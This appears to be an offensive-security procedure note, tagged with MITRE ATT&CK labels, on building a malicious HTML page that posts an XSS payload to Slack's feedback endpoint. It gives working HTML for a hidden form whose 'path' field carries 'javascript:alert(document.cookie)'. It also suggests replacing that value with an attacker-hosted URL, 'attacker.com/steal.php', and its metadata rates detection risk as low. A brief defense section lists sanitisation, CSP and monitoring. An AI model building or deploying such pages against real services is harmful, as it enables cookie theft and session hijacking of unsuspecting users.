---
id: proc-uuid-1
tags:
  - xss
  - html-form
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:43.771Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-HTML-Page-for-Slack-Feedback-XSS

## Summary

This procedure creates a malicious HTML page containing a form that targets Slack's feedback submission endpoint with an unsanitized 'path' parameter, enabling reflected XSS injection.

## Description

In the context of exploiting Slack's feedback feature, this procedure involves crafting an HTML document with a POST form that includes hidden inputs for required parameters. The 'path' field is set to a malicious payload such as a javascript: URI to execute arbitrary code or an external URL for redirection. This page serves as the delivery mechanism for the XSS attack, which can lead to JavaScript execution in the victim's browser when submitted to https://api.slack.com/feedback/submit. Prerequisites include basic HTML knowledge and access to a text editor; no network access is needed for creation, but hosting is required for delivery.

## Requirements

1. Text editor (e.g., VS Code, Notepad++)
2. Knowledge of HTML form syntax
3. Understanding of XSS payloads (javascript: URIs or external redirects)

## Defense

Defensive measures and detection strategies:

- Input sanitization on server-side for parameters like 'path' to block javascript: and untrusted URLs
- Content Security Policy (CSP) to restrict script execution and external redirects
- Monitoring for anomalous POST requests to feedback endpoints with suspicious payloads

## Objectives

1. Construct a functional HTML form targeting the vulnerable endpoint
2. Embed malicious payload in 'path' for reflection
3. Prepare page for auto-submission in subsequent steps

## Instructions

### Step 1: Define the HTML Structure

**Context**: Start with a basic HTML boilerplate and add the form element pointing to the Slack endpoint.

Create the file with the following content:

```html
<!DOCTYPE html>
<html>
<head><title>XSS Test</title></head>
<body>
<form name="pisarenko" action="https://api.slack.com/feedback/submit" method="POST">
</form>
</body>
</html>
```

> This sets up the form named 'pisarenko' for later JavaScript targeting.

### Step 2: Add Hidden Inputs with Payload

**Context**: Insert hidden fields for 'crumb', 'path', and 'vote' to mimic legitimate submission while injecting the payload.

Add inside the form:

```html
<input type="hidden" name="crumb" value="1">
<input type="hidden" name="path" value="javascript:alert(document.cookie)">
<input type="hidden" name="vote" value="Yes">
```

> Replace the 'path' value with your desired payload, e.g., 'https://attacker.com/steal.php' for redirection. Save the file as 'xss.html'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[html-form]]
- [[payload-injection]]
